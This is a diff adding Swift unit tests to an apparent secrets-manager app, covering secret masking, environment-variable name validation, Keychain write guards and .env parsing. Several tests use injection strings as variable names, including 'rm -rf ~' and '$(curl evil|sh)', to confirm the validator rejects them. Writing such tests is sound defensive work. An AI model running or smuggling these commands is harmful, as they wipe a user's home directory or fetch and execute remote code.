@@ -340,3 +340,124 @@ struct KeyEditorViewModelTests {
         #expect(store.overriddenCategory(for: "GITHUB_TOKEN") == nil)
     }
 }
+
+@Suite("SecretMask Tests")
+struct SecretMaskTests {
+
+    @Test("Short values are fully masked with no original characters and a fixed width (hides length)")
+    func shortValueFullyMasked() {
+        let short = "abcdefghi" // 9 chars, below the reveal threshold
+        let masked = SecretMask.mask(short)
+        #expect(!masked.contains("a"))
+        #expect(masked.allSatisfy { $0 == "*" })
+        #expect(masked.count != short.count) // fixed width, doesn't leak the real length
+
+        // A different short value of a different length must mask to the SAME width.
+        let otherShort = "ab"
+        #expect(SecretMask.mask(otherShort).count == masked.count)
+    }
+
+    @Test("Long values reveal only a short prefix and never the suffix")
+    func longValueRevealsPrefixOnly() {
+        let long = "sk-ant-1234567890ABCDEF" // >= 16 chars
+        let masked = SecretMask.mask(long)
+        #expect(masked.hasPrefix("sk-a"))
+        #expect(!masked.contains("ABCDEF"))
+        #expect(!masked.hasSuffix("EF"))
+    }
+
+    @Test("Boundary: value exactly at threshold-1 is fully masked, at threshold reveals prefix")
+    func boundaryBehavior() {
+        let justBelow = String(repeating: "x", count: 15)
+        let atThreshold = String(repeating: "y", count: 16)
+        #expect(SecretMask.mask(justBelow).allSatisfy { $0 == "*" })
+        #expect(SecretMask.mask(atThreshold).hasPrefix("yyyy"))
+    }
+}
+
+@Suite("EnvVarName Tests")
+struct EnvVarNameTests {
+
+    @Test("Valid env var names are accepted")
+    func acceptsValidNames() {
+        #expect(EnvVarName.isValid("OPENAI_API_KEY"))
+        #expect(EnvVarName.isValid("_x"))
+        #expect(EnvVarName.isValid("A"))
+        #expect(EnvVarName.isValid("_1_2_3"))
+    }
+
+    @Test("Invalid env var names are rejected")
+    func rejectsInvalidNames() {
+        #expect(!EnvVarName.isValid("EVIL\"; rm -rf ~; #"))
+        #expect(!EnvVarName.isValid("has space"))
+        #expect(!EnvVarName.isValid("1leading"))
+        #expect(!EnvVarName.isValid(""))
+    }
+
+    @Test("Names with embedded newlines are rejected (anchors match whole string, not line)")
+    func rejectsMultilineNames() {
+        // ^/$ が行アンカーとして働くと "A\nB" の "A" 行がマッチしてしまう。
+        // 文字列全体アンカーであることを担保する回帰テスト。
+        #expect(!EnvVarName.isValid("A\nB"))
+        #expect(!EnvVarName.isValid("SAFE\nEVIL; rm -rf ~"))
+        #expect(!EnvVarName.isValid("SAFE\n"))
+    }
+
+    @Test("isValid does not trim: surrounding whitespace makes a name invalid")
+    func doesNotTrim() {
+        // isValid(x) が true なら「x そのもの」が安全、という不変条件を担保。
+        #expect(!EnvVarName.isValid(" MY_KEY "))
+        #expect(!EnvVarName.isValid("MY_KEY "))
+        #expect(EnvVarName.isValid("MY_KEY"))
+    }
+}
+
+@Suite("KeychainService sink validation Tests (#116)")
+struct KeychainServiceSinkValidationTests {
+
+    @Test("save rejects an invalid account name before touching the Keychain")
+    func saveRejectsInvalidAccount() {
+        // ガードは SecItem 呼び出し前に throw するため、実 Keychain に触れずに検証できる。
+        // 外部由来（共有ファイル等）の不正な名前がどの ingress からでも書き込まれないこと。
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "EVIL\"; rm -rf ~; #")
+        }
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "has space")
+        }
+        #expect(throws: KeychainError.self) {
+            try KeychainService.shared.save(value: "x", for: "X=x $(curl evil|sh)")
+        }
+    }
+}
+
+@Suite("EnvParser key validation Tests (#116)")
+struct EnvParserKeyValidationTests {
+
+    @Test("A line with an invalid key name is skipped during parsing")
+    func invalidKeyIsSkipped() {
+        let text = "EVIL\"; rm -rf ~; #=malicious"
+        let entries = EnvParser.parse(text)
+        #expect(entries.isEmpty)
+    }
+
+    @Test("A line with a valid key name parses normally")
+    func validKeyParses() {
+        let text = "MY_CUSTOM_TOKEN=abc123"
+        let entries = EnvParser.parse(text)
+        #expect(entries.count == 1)
+        #expect(entries[0].key == "MY_CUSTOM_TOKEN")
+        #expect(entries[0].value == "abc123")
+    }
+
+    @Test("A mixed block only imports the entry with a valid key name")
+    func mixedBlockFiltersInvalidKeys() {
+        let text = """
+        export MY_CUSTOM_TOKEN=abc123
+        has space=shouldbeskipped
+        """
+        let entries = EnvParser.parse(text)
+        #expect(entries.count == 1)
+        #expect(entries[0].key == "MY_CUSTOM_TOKEN")
+    }
+}
